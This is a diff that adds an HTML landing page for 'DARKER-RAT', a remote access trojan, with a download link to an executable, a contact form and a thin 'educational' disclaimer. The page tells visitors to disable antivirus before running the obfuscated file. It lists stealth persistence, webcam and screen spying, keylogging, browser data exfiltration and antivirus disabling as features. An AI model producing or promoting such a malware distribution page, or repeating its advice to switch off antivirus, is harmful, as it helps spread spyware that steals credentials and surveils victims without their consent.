@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🌌 DARKER-RAT | Remote Administration Tool</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <canvas id="matrix"></canvas>
+
+  <div class="container">
+    <header>
+      <h1>🌌 <span class="glow">DARKER-RAT</span></h1>
+      <p>Advanced Remote Administration Tool • Stealth • Control • Power</p>
+    </header>
+
+    <nav>
+      <button onclick="showSection('download')">📥 Download</button>
+      <button onclick="showSection('manuals')">📘 Manuals</button>
+      <button onclick="showSection('contact')">📨 Contact</button>
+    </nav>
+
+    <main>
+      <section id="download" class="active">
+        <h2>Download DARKER-RAT</h2>
+        <p>Latest version: <strong>v1.3.3.7</strong></p>
+        <a href="assets/darker-rat.exe" download class="btn-download">⬇️ Download Now</a>
+        <p class="note">* File is packed & obfuscated. Disable AV before execution.</p>
+      </section>
+
+      <section id="manuals" style="display:none;">
+        <h2>User Manuals</h2>
+        <ul>
+          <li>✅ Auto-persistence via trusted process cloning</li>
+          <li>✅ Real-time screen & webcam streaming</li>
+          <li>✅ Keylogger + browser data exfiltration</li>
+          <li>✅ AV disable & self-defense mechanisms</li>
+          <li>✅ Chat interface with server sync</li>
+        </ul>
+        <p>Full documentation available upon request.</p>
+      </section>
+
+      <section id="contact" style="display:none;">
+        <h2>Contact Developer</h2>
+        <form id="contactForm">
+          <input type="text" id="name" placeholder="Your Name" required />
+          <input type="email" id="email" placeholder="Your Email" required />
+          <textarea id="message" placeholder="Your Message..." rows="4" required></textarea>
+          <button type="submit" class="btn-contact">📤 Send Message</button>
+        </form>
+        <p class="status" id="formStatus"></p>
+      </section>
+    </main>
+
+    <footer>
+      <p>© 2025 DARKER-RAT | For educational & authorized testing only.</p>
+    </footer>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
